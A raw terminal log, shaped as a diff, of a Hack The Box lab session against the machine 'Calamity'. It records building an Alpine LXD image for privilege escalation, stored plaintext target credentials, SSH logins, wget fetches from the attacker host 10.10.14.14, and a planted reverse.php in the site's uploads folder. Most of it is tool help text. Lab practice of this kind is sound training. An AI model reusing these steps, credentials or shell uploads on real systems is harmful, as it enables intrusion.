@@ -1,0 +1,660 @@
+root@parrot:~/hackthebox/calamity# pip install audiodiff                        
+DEPRECATION: Python 2.7 will reach the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 won't be maintained after that date. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support            
+Collecting audiodiff                    
+  Downloading https://files.pythonhosted.org/packages/f6/2a/1a1be77a2849c8c7fccc125918553765a4de05906048472423c9193433d3/audiodiff-0.3.0.tar.gz (2.0MB)         
+     |████████████████████████████████| 2.0MB 86kB/s                            
+Collecting mutagenwrapper==0.0.5        
+  Downloading https://files.pythonhosted.org/packages/88/ac/e0c725aef5e6444b3b20c3be9b46e080c16af4b8ff21da2a30d0b70bd645/mutagenwrapper-0.0.5.tar.gz (313kB)    
+     |████████████████████████████████| 317kB 38kB/s                            
+Requirement already satisfied: termcolor==1.1.0 in /usr/lib/python2.7/dist-packages (from audiodiff) (1.1.0)                                                    
+Collecting mutagen==1.21                
+  Downloading https://files.pythonhosted.org/packages/9b/33/14cbc81ed85637110ae8312f622f4286a473676f19424473a895a3313544/mutagen-1.21.tar.gz (795kB)            
+     |████████████████████████████████| 798kB 58kB/s                            
+Building wheels for collected packages: audiodiff, mutagenwrapper, mutagen      
+  Building wheel for audiodiff (setup.py) ... done                              
+  Created wheel for audiodiff: filename=audiodiff-0.3.0-cp27-none-any.whl size=7529 sha256=7ad8035b393d57045855fb01a5f028d364c74eef05a314d975e4791f73bd4278     
+  Stored in directory: /root/.cache/pip/wheels/e0/87/1c/3938e02a0fb48011ec36529883f1f36fc58eb39bf9a1a618d5                                                      
+  Building wheel for mutagenwrapper (setup.py) ... done                         
+  Created wheel for mutagenwrapper: filename=mutagenwrapper-0.0.5-cp27-none-any.whl size=8332 sha256=a2c72ffcc2a3141130ea9c80c1e9151f04261f3d9215fbd5d126fe7dc2e5cc18                                   
+  Stored in directory: /root/.cache/pip/wheels/3f/72/14/754e0f0488d72395242709549b48ab2e14160548f0c721fd11                                                      
+  Building wheel for mutagen (setup.py) ... done                                
+  Created wheel for mutagen: filename=mutagen-1.21-cp27-none-any.whl size=112247 sha256=2e56844e681f2ce6f5730bcaa8404acc5d019dc09f8f01ebc35a6f14c083d3f6        
+  Stored in directory: /root/.cache/pip/wheels/89/8c/33/8c932c4922b5307205fc0cea84b1b2d6c6bf0a8a3e5f2ee175                                                      
+Successfully built audiodiff mutagenwrapper mutagen                             
+Installing collected packages: mutagen, mutagenwrapper, audiodiff               
+Successfully installed audiodiff-0.3.0 mutagen-1.21 mutagenwrapper-0.0.5        
+root@parrot:~/hackthebox/calamity# cd /opt/                                     
+root@parrot:/opt# git clone https://github.com/saghul/lxd-alpine-builder.git    
+Cloning into 'lxd-alpine-builder'...    
+remote: Enumerating objects: 27, done.  
+remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27                  
+Unpacking objects: 100% (27/27), done.  
+root@parrot:/opt# cd lxd-alpine-builder/
+root@parrot:/opt/lxd-alpine-builder# ls 
+build-alpine  LICENSE  README.md        
+root@parrot:/opt/lxd-alpine-builder# ./build-alpine -a i686                     
+Determining the latest release... v3.11 
+Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.11/main/x86      
+Downloading alpine-mirrors-3.5.10-r0.apk                                        
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+Downloading alpine-keys-2.1-r2.apk      
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+Downloading apk-tools-static-2.10.4-r3.apk                                      
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'         
+alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK                         
+Verified OK                             
+Selecting mirror http://uk.alpinelinux.org/alpine/v3.11/main                    
+fetch http://uk.alpinelinux.org/alpine/v3.11/main/x86/APKINDEX.tar.gz           
+(1/19) Installing musl (1.1.24-r0)      
+(2/19) Installing busybox (1.31.1-r8)   
+Executing busybox-1.31.1-r8.post-install                                        
+(3/19) Installing alpine-baselayout (3.2.0-r3)                                  
+Executing alpine-baselayout-3.2.0-r3.pre-install                                
+Executing alpine-baselayout-3.2.0-r3.post-install                               
+(4/19) Installing openrc (0.42.1-r0)    
+Executing openrc-0.42.1-r0.post-install 
+(5/19) Installing alpine-conf (3.8.3-r4)                                        
+(6/19) Installing libcrypto1.1 (1.1.1d-r3)                                      
+(7/19) Installing libssl1.1 (1.1.1d-r3) 
+(8/19) Installing ca-certificates-cacert (20191127-r0)                          
+(9/19) Installing libtls-standalone (2.9.1-r0)                                  
+(10/19) Installing ssl_client (1.31.1-r8)                                       
+(11/19) Installing zlib (1.2.11-r3)     
+(12/19) Installing apk-tools (2.10.4-r3)                                        
+(13/19) Installing busybox-suid (1.31.1-r8)                                     
+(14/19) Installing busybox-initscripts (3.2-r2)                                 
+Executing busybox-initscripts-3.2-r2.post-install                               
+(15/19) Installing scanelf (1.2.4-r0)   
+(16/19) Installing musl-utils (1.1.24-r0)                                       
+(17/19) Installing libc-utils (0.7.2-r0)                                        
+(18/19) Installing alpine-keys (2.1-r2) 
+(19/19) Installing alpine-base (3.11.2-r0)                                      
+Executing busybox-1.31.1-r8.trigger     
+OK: 8 MiB in 19 packages                
+root@parrot:/opt/lxd-alpine-builder# ls -la                                     
+total 3220                              
+drwxr-xr-x  3 root root    4096 Jan 15 04:09 .                                  
+drwxr-xr-x 48 root root    4096 Jan 15 04:04 ..                                 
+-rw-r--r--  1 root root 3242708 Jan 15 04:09 alpine-v3.11-i686-20200115_0409.tar.gz                                                                             
+-rwxr-xr-x  1 root root    7498 Jan 15 04:04 build-alpine                       
+drwxr-xr-x  8 root root    4096 Jan 15 04:04 .git                               
+-rw-r--r--  1 root root   26530 Jan 15 04:04 LICENSE                            
+-rw-r--r--  1 root root     768 Jan 15 04:04 README.md                          
+root@parrot:/opt/lxd-alpine-builder# ls -/                                      
+ls: invalid option -- '/'               
+Try 'ls --help' for more information.   
+root@parrot:/opt/lxd-alpine-builder# ls ~/hackthebox/calamity/                  
+creds  nmap  www  xalvas-files          
+root@parrot:/opt/lxd-alpine-builder# cat ~/hackthebox/calamity/creds                                                                                            
+username : admin                        
+password : skoupidotenekes              
+root@parrot:/opt/lxd-alpine-builder# cat ~/hackthebox/calamity/xalvas-files/    
+recov.wav      rick.wav       ssh_password   xouzouris.wav                      
+root@parrot:/opt/lxd-alpine-builder# cat ~/hackthebox/calamity/xalvas-files/ssh_password                                                                        
+username : xalvas                       
+password : 18547936..*                  
+root@parrot:/opt/lxd-alpine-builder# scp alpine-v3.11-i686-20200115_0409.tar.gz xalvas@10.10.10.27                                                              
+root@parrot:/opt/lxd-alpine-builder# scp alpine-v3.11-i686-20200115_0409.tar.gz xalvas@10.10.10.27:                                                             
+xalvas@10.10.10.27's password:          
+alpine-v3.11-i686-20200115_0409.tar.gz                                                                                          0%    0     0.0KB/s   --:-- ETA^Croot@parrot:/opt/lxd-alpine-builder# ssh xalvas@10.10.10.27                    
+xalvas@10.10.10.27's password:          
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic i686)                 
+
+ * Documentation:  https://help.ubuntu.com                                      
+ * Management:     https://landscape.canonical.com                              
+ * Support:        https://ubuntu.com/advantage                                 
+
+9 packages can be updated.              
+8 updates are security updates.         
+
+
+Last login: Wed Jan 15 03:55:30 2020 from 10.10.14.14                           
+xalvas@calamity:~$ wget http://10.10.14.14:8000/alpine-v3.11-i686-20200115_0409.tar.gz                                                                          
+--2020-01-15 04:20:54--  http://10.10.14.14:8000/alpine-v3.11-i686-20200115_0409.tar.gz                                                                         
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... client_loop: send disconnect: Connection timed out                                                                      
+Read error (Connection timed out) in headers.                                   
+Retrying.                               
+
+--2020-01-15 04:35:56--  (try: 2)  http://10.10.14.14:8000/alpine-v3.11-i686-20200115_0409.tar.gz                                                               
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 3242708 (3.1M) [application/gzip]                                       
+Saving to: ‘alpine-v3.11-i686-20200115_0409.tar.gz.1’                           
+
+alpine-v3.11-i686-20200115_0409.tar.gz.  15%[===========>                                                                    ] 496.32K  --.-KB/s    eta 17m 53s^C                                       
+xalvas@calamity:~$ ls                   
+alarmclocks  alpine-v3.11-i686-20200115_0409.tar.gz  alpine-v3.11-i686-20200115_0409.tar.gz.1  app  dontforget.txt  intrusions  peda  recov.wav  user.txt       
+xalvas@calamity:~$ file al              
+al: cannot open `al' (No such file or directory)                                
+xalvas@calamity:~$ file alpine-v3.11-i686-20200115_0409.tar.gz                  
+alpine-v3.11-i686-20200115_0409.tar.gz: empty                                   
+xalvas@calamity:~$ rm alpine-v3.11-i686-20200115_0409.tar.gz                    
+xalvas@calamity:~$ wget http://10.10.14.14:8000/alpine-v3.11-i686-20200115_0409.tar.gz                                                                          
+--2020-01-15 04:42:20--  http://10.10.14.14:8000/alpine-v3.11-i686-20200115_0409.tar.gz                                                                         
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... ^Z                                      
+[1]+  Stopped                 wget http://10.10.14.14:8000/alpine-v3.11-i686-20200115_0409.tar.gz                                                               
+xalvas@calamity:~$ fg                   
+wget http://10.10.14.14:8000/alpine-v3.11-i686-20200115_0409.tar.gz             
+
+^C                                      
+xalvas@calamity:~$ wget http://10.10.14.14:80/alpine-v3.11-i686-20200115_0409.tar.gz                                                                            
+--2020-01-15 04:56:19--  http://10.10.14.14/alpine-v3.11-i686-20200115_0409.tar.gz                                                                              
+Connecting to 10.10.14.14:80... connected.                                      
+HTTP request sent, awaiting response... ^C                                      
+xalvas@calamity:~$ exit                 
+logout                                  
+Connection to 10.10.10.27 closed.       
+root@parrot:/opt/lxd-alpine-builder# ls                                                                                                                         
+apline  build-alpine  LICENSE  README.md
+root@parrot:/opt/lxd-alpine-builder# cd apline/                                 
+root@parrot:/opt/lxd-alpine-builder/apline# ls                                  
+alpine-v3.11-i686-20200115_0409.tar.gz  metadata.yaml  rootfs  templates        
+root@parrot:/opt/lxd-alpine-builder/apline# cd rootfs/                          
+root@parrot:/opt/lxd-alpine-builder/apline/rootfs# ls -la                       
+total 76                                
+drwxr-xr-x 19 root root 4096 Jan 15 04:09 .                                     
+drwxr-xr-x  4 root root 4096 Jan 15 05:44 ..                                    
+drwxr-xr-x  2 root root 4096 Jan 15 04:09 bin                                   
+drwxr-xr-x  4 root root 4096 Jan 15 04:09 dev                                   
+drwxr-xr-x 19 root root 4096 Jan 15 04:09 etc                                   
+drwxr-xr-x  2 root root 4096 Jan 15 04:09 home                                  
+drwxr-xr-x  6 root root 4096 Jan 15 04:09 lib                                   
+drwxr-xr-x  5 root root 4096 Jan 15 04:09 media                                 
+drwxr-xr-x  2 root root 4096 Jan 15 04:09 mnt                                   
+drwxr-xr-x  2 root root 4096 Jan 15 04:09 opt                                   
+dr-xr-xr-x  2 root root 4096 Jan 15 04:08 proc                                  
+drwx------  2 root root 4096 Jan 15 04:09 root                                  
+drwxr-xr-x  2 root root 4096 Jan 15 04:09 run                                   
+drwxr-xr-x  2 root root 4096 Jan 15 04:09 sbin                                  
+drwxr-xr-x  2 root root 4096 Jan 15 04:09 srv                                   
+drwxr-xr-x  2 root root 4096 Jan 15 04:09 sys                                   
+drwxrwxrwt  2 root root 4096 Jan 15 04:08 tmp                                   
+drwxr-xr-x  7 root root 4096 Jan 15 04:09 usr                                   
+drwxr-xr-x 12 root root 4096 Jan 15 04:09 var                                   
+root@parrot:/opt/lxd-alpine-builder/apline/rootfs# cd bin                       
+root@parrot:/opt/lxd-alpine-builder/apline/rootfs/bin# ls                       
+arch      cat     date           echo     fgrep   hostname  link     lzop      mount       pidof          pwd        run-parts  stat   true    zcat             
+ash       chgrp   dd             ed       fsync   ionice    linux32  makemime  mountpoint  ping           rc-status  sed        stty   umount                   
+base64    chmod   df             egrep    getopt  iostat    linux64  mkdir     mpstat      ping6          reformime  setpriv    su     uname                    
+bbconfig  chown   dmesg          false    grep    ipcalc    ln       mknod     mv          pipe_progress  rev        setserial  sync   uniso                    
+bbsuid    conspy  dnsdomainname  fatattr  gunzip  kbd_mode  login    mktemp    netstat     printenv       rm         sh         tar    usleep                   
+busybox   cp      dumpkmap       fdflush  gzip    kill      ls       more      nice        ps             rmdir      sleep      touch  watch                    
+root@parrot:/opt/lxd-alpine-builder/apline/rootfs/bin# cd ..                    
+root@parrot:/opt/lxd-alpine-builder/apline/rootfs# dd bin                       
+dd: unrecognized operand ‘bin’          
+Try 'dd --help' for more information.   
+root@parrot:/opt/lxd-alpine-builder/apline/rootfs# dd --help                    
+Usage: dd [OPERAND]...                  
+  or:  dd OPTION                        
+Copy a file, converting and formatting according to the operands.               
+
+  bs=BYTES        read and write up to BYTES bytes at a time (default: 512);    
+                  overrides ibs and obs 
+  cbs=BYTES       convert BYTES bytes at a time                                 
+  conv=CONVS      convert the file as per the comma separated symbol list       
+  count=N         copy only N input blocks                                      
+  ibs=BYTES       read up to BYTES bytes at a time (default: 512)               
+  if=FILE         read from FILE instead of stdin                               
+  iflag=FLAGS     read as per the comma separated symbol list                   
+  obs=BYTES       write BYTES bytes at a time (default: 512)                    
+  of=FILE         write to FILE instead of stdout                               
+  oflag=FLAGS     write as per the comma separated symbol list                  
+  seek=N          skip N obs-sized blocks at start of output                    
+  skip=N          skip N ibs-sized blocks at start of input                     
+  status=LEVEL    The LEVEL of information to print to stderr;                  
+                  'none' suppresses everything but error messages,              
+                  'noxfer' suppresses the final transfer statistics,            
+                  'progress' shows periodic transfer statistics                 
+
+N and BYTES may be followed by the following multiplicative suffixes:           
+c =1, w =2, b =512, kB =1000, K =1024, MB =1000*1000, M =1024*1024, xM =M,      
+GB =1000*1000*1000, G =1024*1024*1024, and so on for T, P, E, Z, Y.             
+
+Each CONV symbol may be:                
+
+  ascii     from EBCDIC to ASCII        
+  ebcdic    from ASCII to EBCDIC        
+  ibm       from ASCII to alternate EBCDIC                                      
+  block     pad newline-terminated records with spaces to cbs-size              
+  unblock   replace trailing spaces in cbs-size records with newline            
+  lcase     change upper case to lower case                                     
+  ucase     change lower case to upper case                                     
+  sparse    try to seek rather than write the output for NUL input blocks       
+  swab      swap every pair of input bytes                                      
+  sync      pad every input block with NULs to ibs-size; when used              
+            with block or unblock, pad with spaces rather than NULs             
+  excl      fail if the output file already exists                              
+  nocreat   do not create the output file                                       
+  notrunc   do not truncate the output file                                     
+  noerror   continue after read errors  
+  fdatasync  physically write output file data before finishing                 
+  fsync     likewise, but also write metadata                                   
+
+Each FLAG symbol may be:                
+
+  append    append mode (makes sense only for output; conv=notrunc suggested)   
+  direct    use direct I/O for data     
+  directory  fail unless a directory    
+  dsync     use synchronized I/O for data                                       
+  sync      likewise, but also for metadata                                     
+  fullblock  accumulate full blocks of input (iflag only)                       
+  nonblock  use non-blocking I/O        
+  noatime   do not update access time   
+  nocache   Request to drop cache.  See also oflag=sync                         
+  noctty    do not assign controlling terminal from file                        
+  nofollow  do not follow symlinks      
+  count_bytes  treat 'count=N' as a byte count (iflag only)                     
+  skip_bytes  treat 'skip=N' as a byte count (iflag only)                       
+  seek_bytes  treat 'seek=N' as a byte count (oflag only)                       
+
+Sending a USR1 signal to a running 'dd' process makes it                        
+print I/O statistics to standard error and then resume copying.                 
+
+Options are:                            
+
+      --help     display this help and exit                                     
+      --version  output version information and exit                            
+
+GNU coreutils online help: <https://www.gnu.org/software/coreutils/>            
+Full documentation at: <https://www.gnu.org/software/coreutils/dd>              
+or available locally via: info '(coreutils) dd invocation'                      
+root@parrot:/opt/lxd-alpine-builder/apline/rootfs# du bin                       
+856     bin                             
+root@parrot:/opt/lxd-alpine-builder/apline/rootfs# ls                           
+bin  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var                                                                       
+root@parrot:/opt/lxd-alpine-builder/apline/rootfs# wget -r --help               
+GNU Wget 1.20.3, a non-interactive network retriever.                           
+Usage: wget [OPTION]... [URL]...        
+
+Mandatory arguments to long options are mandatory for short options too.        
+
+Startup:                                
+  -V,  --version                   display the version of Wget and exit         
+  -h,  --help                      print this help                              
+  -b,  --background                go to background after startup               
+  -e,  --execute=COMMAND           execute a `.wgetrc'-style command            
+
+Logging and input file:                 
+  -o,  --output-file=FILE          log messages to FILE                         
+  -a,  --append-output=FILE        append messages to FILE                      
+  -d,  --debug                     print lots of debugging information          
+  -q,  --quiet                     quiet (no output)                            
+  -v,  --verbose                   be verbose (this is the default)             
+  -nv, --no-verbose                turn off verboseness, without being quiet    
+       --report-speed=TYPE         output bandwidth as TYPE.  TYPE can be bits  
+  -i,  --input-file=FILE           download URLs found in local or external FILE                                                                                
+  -F,  --force-html                treat input file as HTML                     
+  -B,  --base=URL                  resolves HTML input-file links (-i -F)       
+                                     relative to URL                            
+       --config=FILE               specify config file to use                   
+       --no-config                 do not read any config file                  
+       --rejected-log=FILE         log reasons for URL rejection to FILE        
+
+Download:                               
+  -t,  --tries=NUMBER              set number of retries to NUMBER (0 unlimits) 
+       --retry-connrefused         retry even if connection is refused          
+       --retry-on-http-error=ERRORS    comma-separated list of HTTP errors to retry                                                                             
+  -O,  --output-document=FILE      write documents to FILE                      
+  -nc, --no-clobber                skip downloads that would download to        
+                                     existing files (overwriting them)          
+       --no-netrc                  don't try to obtain credentials from .netrc  
+  -c,  --continue                  resume getting a partially-downloaded file   
+       --start-pos=OFFSET          start downloading from zero-based position OFFSET                                                                            
+       --progress=TYPE             select progress gauge type                   
+       --show-progress             display the progress bar in any verbosity mode                                                                               
+  -N,  --timestamping              don't re-retrieve files unless newer than    
+                                     local                                      
+       --no-if-modified-since      don't use conditional if-modified-since get  
+                                     requests in timestamping mode              
+       --no-use-server-timestamps  don't set the local file's timestamp by      
+                                     the one on the server                      
+  -S,  --server-response           print server response                        
+       --spider                    don't download anything                      
+  -T,  --timeout=SECONDS           set all timeout values to SECONDS            
+       --dns-timeout=SECS          set the DNS lookup timeout to SECS           
+       --connect-timeout=SECS      set the connect timeout to SECS              
+       --read-timeout=SECS         set the read timeout to SECS                 
+  -w,  --wait=SECONDS              wait SECONDS between retrievals              
+       --waitretry=SECONDS         wait 1..SECONDS between retries of a retrieval                                                                               
+       --random-wait               wait from 0.5*WAIT...1.5*WAIT secs between retrievals                                                                        
+       --no-proxy                  explicitly turn off proxy                    
+  -Q,  --quota=NUMBER              set retrieval quota to NUMBER                
+       --bind-address=ADDRESS      bind to ADDRESS (hostname or IP) on local host                                                                               
+       --limit-rate=RATE           limit download rate to RATE                  
+       --no-dns-cache              disable caching DNS lookups                  
+       --restrict-file-names=OS    restrict chars in file names to ones OS allows                                                                               
+       --ignore-case               ignore case when matching files/directories  
+  -4,  --inet4-only                connect only to IPv4 addresses               
+  -6,  --inet6-only                connect only to IPv6 addresses               
+       --prefer-family=FAMILY      connect first to addresses of specified family,                                                                              
+                                     one of IPv6, IPv4, or none                 
+       --user=USER                 set both ftp and http user to USER           
+       --password=PASS             set both ftp and http password to PASS       
+       --ask-password              prompt for passwords                         
+       --use-askpass=COMMAND       specify credential handler for requesting    
+                                     username and password.  If no COMMAND is   
+                                     specified the WGET_ASKPASS or the SSH_ASKPASS                                                                              
+                                     environment variable is used.              
+       --no-iri                    turn off IRI support                         
+       --local-encoding=ENC        use ENC as the local encoding for IRIs       
+       --remote-encoding=ENC       use ENC as the default remote encoding       
+       --unlink                    remove file before clobber                   
+       --xattr                     turn on storage of metadata in extended file attributes                                                                      
+
+Directories:                            
+  -nd, --no-directories            don't create directories                     
+  -x,  --force-directories         force creation of directories                
+  -nH, --no-host-directories       don't create host directories                
+       --protocol-directories      use protocol name in directories             
+  -P,  --directory-prefix=PREFIX   save files to PREFIX/..                      
+       --cut-dirs=NUMBER           ignore NUMBER remote directory components    
+
+HTTP options:                           
+       --http-user=USER            set http user to USER                        
+       --http-password=PASS        set http password to PASS                    
+       --no-cache                  disallow server-cached data                  
+       --default-page=NAME         change the default page name (normally       
+                                     this is 'index.html'.)                     
+  -E,  --adjust-extension          save HTML/CSS documents with proper extensions                                                                               
+       --ignore-length             ignore 'Content-Length' header field         
+       --header=STRING             insert STRING among the headers              
+       --compression=TYPE          choose compression, one of auto, gzip and none. (default: none)                                                              
+       --max-redirect              maximum redirections allowed per page        
+       --proxy-user=USER           set USER as proxy username                   
+       --proxy-password=PASS       set PASS as proxy password                   
+       --referer=URL               include 'Referer: URL' header in HTTP request                                                                                
+       --save-headers              save the HTTP headers to file                
+  -U,  --user-agent=AGENT          identify as AGENT instead of Wget/VERSION    
+       --no-http-keep-alive        disable HTTP keep-alive (persistent connections)                                                                             
+       --no-cookies                don't use cookies                            
+       --load-cookies=FILE         load cookies from FILE before session        
+       --save-cookies=FILE         save cookies to FILE after session           
+       --keep-session-cookies      load and save session (non-permanent) cookies                                                                                
+       --post-data=STRING          use the POST method; send STRING as the data 
+       --post-file=FILE            use the POST method; send contents of FILE   
+       --method=HTTPMethod         use method "HTTPMethod" in the request       
+       --body-data=STRING          send STRING as data. --method MUST be set    
+       --body-file=FILE            send contents of FILE. --method MUST be set  
+       --content-disposition       honor the Content-Disposition header when    
+                                     choosing local file names (EXPERIMENTAL)   
+       --content-on-error          output the received content on server errors 
+       --auth-no-challenge         send Basic HTTP authentication information   
+                                     without first waiting for the server's     
+                                     challenge                                  
+
+HTTPS (SSL/TLS) options:                
+       --secure-protocol=PR        choose secure protocol, one of auto, SSLv2,  
+                                     SSLv3, TLSv1, TLSv1_1, TLSv1_2 and PFS     
+       --https-only                only follow secure HTTPS links               
+       --no-check-certificate      don't validate the server's certificate      
+       --certificate=FILE          client certificate file                      
+       --certificate-type=TYPE     client certificate type, PEM or DER          
+       --private-key=FILE          private key file                             
+       --private-key-type=TYPE     private key type, PEM or DER                 
+       --ca-certificate=FILE       file with the bundle of CAs                  
+       --ca-directory=DIR          directory where hash list of CAs is stored   
+       --crl-file=FILE             file with bundle of CRLs                     
+       --pinnedpubkey=FILE/HASHES  Public key (PEM/DER) file, or any number     
+                                   of base64 encoded sha256 hashes preceded by  
+                                   'sha256//' and separated by ';', to verify   
+                                   peer against                                 
+
+       --ciphers=STR           Set the priority string (GnuTLS) or cipher list string (OpenSSL) directly.                                                       
+                                   Use with care. This option overrides --secure-protocol.                                                                      
+                                   The format and syntax of this string depend on the specific SSL/TLS engine.                                                  
+HSTS options:                           
+       --no-hsts                   disable HSTS                                 
+       --hsts-file                 path of HSTS database (will override default)                                                                                
+
+FTP options:                            
+       --ftp-user=USER             set ftp user to USER                         
+       --ftp-password=PASS         set ftp password to PASS                     
+       --no-remove-listing         don't remove '.listing' files                
+       --no-glob                   turn off FTP file name globbing              
+       --no-passive-ftp            disable the "passive" transfer mode          
+       --preserve-permissions      preserve remote file permissions             
+       --retr-symlinks             when recursing, get linked-to files (not dir)                                                                                
+
+FTPS options:                           
+       --ftps-implicit                 use implicit FTPS (default port is 990)  
+       --ftps-resume-ssl               resume the SSL/TLS session started in the control connection when                                                        
+                                         opening a data connection              
+       --ftps-clear-data-connection    cipher the control channel only; all the data will be in plaintext                                                       
+       --ftps-fallback-to-ftp          fall back to FTP if FTPS is not supported in the target server                                                           
+WARC options:                           
+       --warc-file=FILENAME        save request/response data to a .warc.gz file                                                                                
+       --warc-header=STRING        insert STRING into the warcinfo record       
+       --warc-max-size=NUMBER      set maximum size of WARC files to NUMBER     
+       --warc-cdx                  write CDX index files                        
+       --warc-dedup=FILENAME       do not store records listed in this CDX file 
+       --no-warc-compression       do not compress WARC files with GZIP         
+       --no-warc-digests           do not calculate SHA1 digests                
+       --no-warc-keep-log          do not store the log file in a WARC record   
+       --warc-tempdir=DIRECTORY    location for temporary files created by the  
+                                     WARC writer                                
+
+Recursive download:                     
+  -r,  --recursive                 specify recursive download                   
+  -l,  --level=NUMBER              maximum recursion depth (inf or 0 for infinite)                                                                              
+       --delete-after              delete files locally after downloading them  
+  -k,  --convert-links             make links in downloaded HTML or CSS point to                                                                                
+                                     local files                                
+       --convert-file-only         convert the file part of the URLs only (usually known as the basename)                                                       
+       --backups=N                 before writing file X, rotate up to N backup files                                                                           
+  -K,  --backup-converted          before converting file X, back up as X.orig  
+  -m,  --mirror                    shortcut for -N -r -l inf --no-remove-listing                                                                                
+  -p,  --page-requisites           get all images, etc. needed to display HTML page                                                                             
+       --strict-comments           turn on strict (SGML) handling of HTML comments                                                                              
+
+Recursive accept/reject:                
+  -A,  --accept=LIST               comma-separated list of accepted extensions  
+  -R,  --reject=LIST               comma-separated list of rejected extensions  
+       --accept-regex=REGEX        regex matching accepted URLs                 
+       --reject-regex=REGEX        regex matching rejected URLs                 
+       --regex-type=TYPE           regex type (posix|pcre)                      
+  -D,  --domains=LIST              comma-separated list of accepted domains     
+       --exclude-domains=LIST      comma-separated list of rejected domains     
+       --follow-ftp                follow FTP links from HTML documents         
+       --follow-tags=LIST          comma-separated list of followed HTML tags   
+       --ignore-tags=LIST          comma-separated list of ignored HTML tags    
+  -H,  --span-hosts                go to foreign hosts when recursive           
+  -L,  --relative                  follow relative links only                   
+  -I,  --include-directories=LIST  list of allowed directories                  
+       --trust-server-names        use the name specified by the redirection    
+                                     URL's last component                       
+  -X,  --exclude-directories=LIST  list of excluded directories                 
+  -np, --no-parent                 don't ascend to the parent directory         
+
+Email bug reports, questions, discussions to <bug-wget@gnu.org>                 
+and/or open issues at https://savannah.gnu.org/bugs/?func=additem&group=wget.   
+root@parrot:/opt/lxd-alpine-builder/apline/rootfs# ^C                           
+root@parrot:/opt/lxd-alpine-builder/apline/rootfs# cd ~/hackthebox/calamity/    
+root@parrot:~/hackthebox/calamity# ls   
+creds  nmap  www  xalvas-files          
+root@parrot:~/hackthebox/calamity# cat xalvas-files/ssh_pass                    
+cat: xalvas-files/ssh_pass: No such file or directory                           
+root@parrot:~/hackthebox/calamity# cat xalvas-files/                            
+cat: xalvas-files/: Is a directory      
+root@parrot:~/hackthebox/calamity# ls   
+creds  nmap  www  xalvas-files          
+root@parrot:~/hackthebox/calamity# cd xalvas-files/                             
+root@parrot:~/hackthebox/calamity/xalvas-files# ls                              
+recov.wav  rick.wav  ssh_pass.aup  ssh_pass_data  ssh_password  xouzouris.wav   
+root@parrot:~/hackthebox/calamity/xalvas-files# cat ssh_password                
+username : xalvas                       
+password : 18547936..*                  
+root@parrot:~/hackthebox/calamity/xalvas-files# ssh xalvas@10.10.10.27          
+xalvas@10.10.10.27's password:          
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic i686)                 
+
+ * Documentation:  https://help.ubuntu.com                                      
+ * Management:     https://landscape.canonical.com                              
+ * Support:        https://ubuntu.com/advantage                                 
+
+9 packages can be updated.              
+8 updates are security updates.         
+
+
+Last login: Wed Jan 15 04:26:23 2020 from 10.10.14.14                           
+xalvas@calamity:~$ cd /var/www/html     
+xalvas@calamity:/var/www/html$ ls       
+admin.php  bg.png  index.html  leet.png  uploads                                
+xalvas@calamity:/var/www/html$ cd upload
+-bash: cd: upload: No such file or directory                                    
+xalvas@calamity:/var/www/html$ cd uploads/                                      
+xalvas@calamity:/var/www/html/uploads$ ls                                       
+metadata.yaml  reverse.php  rootfs      
+xalvas@calamity:/var/www/html/uploads$ du rootfs/                               
+8       rootfs/10.10.14.14:8000/root    
+8       rootfs/10.10.14.14:8000/var     
+8       rootfs/10.10.14.14:8000/sys     
+8       rootfs/10.10.14.14:8000/etc     
+8       rootfs/10.10.14.14:8000/sbin    
+8       rootfs/10.10.14.14:8000/mnt     
+8       rootfs/10.10.14.14:8000/media   
+8       rootfs/10.10.14.14:8000/opt     
+8       rootfs/10.10.14.14:8000/run     
+8       rootfs/10.10.14.14:8000/lib     
+8       rootfs/10.10.14.14:8000/home    
+20      rootfs/10.10.14.14:8000/bin     
+8       rootfs/10.10.14.14:8000/dev     
+8       rootfs/10.10.14.14:8000/proc    
+8       rootfs/10.10.14.14:8000/tmp     
+8       rootfs/10.10.14.14:8000/srv     
+8       rootfs/10.10.14.14:8000/usr     
+156     rootfs/10.10.14.14:8000         
+160     rootfs/                         
